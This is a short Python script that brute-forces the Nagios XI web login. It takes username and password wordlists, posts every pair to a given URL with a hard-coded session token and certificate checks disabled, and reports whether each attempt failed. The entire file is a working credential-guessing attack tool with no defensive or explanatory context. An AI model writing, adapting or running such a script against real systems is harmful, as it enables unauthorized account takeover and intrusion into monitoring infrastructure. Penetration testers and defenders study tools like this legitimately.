import requests
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--usernames", type=str)
parser.add_argument("-p", "--passwords", type=str)
parser.add_argument("-url", type=str)

args = parser.parse_args()

if not os.path.exists(args.usernames):
    raise FileNotFoundError(f"Cound not load usernames from {args.usernames}")

if not os.path.exists(args.passwords):
    raise FileNotFoundError(f"Cound not load passwords from {args.passwords}")

with open(args.usernames) as f:
    usernames = f.read().split("\n")

with open(args.passwords) as f:
    passwords = f.read().split("\n")


body = {
    "nsp": "0a9c28bab6f7feeadb43eaf41dff0875ed1d06636266e86fd2e6146795289ad3",  #update it with yours
    "page": "auth",
    "pageopt": "login",
    "redirect":"/nagiosxi/index.php",
    "loginButton": "",
    "debug": "",
}
for username in usernames:
    for password in passwords:
        body["username"] = username
        body["password"] = password
        res = requests.post(args.url, json=body, verify=False)
        res.raise_for_status()
        print("Invalid username or password" in res.text)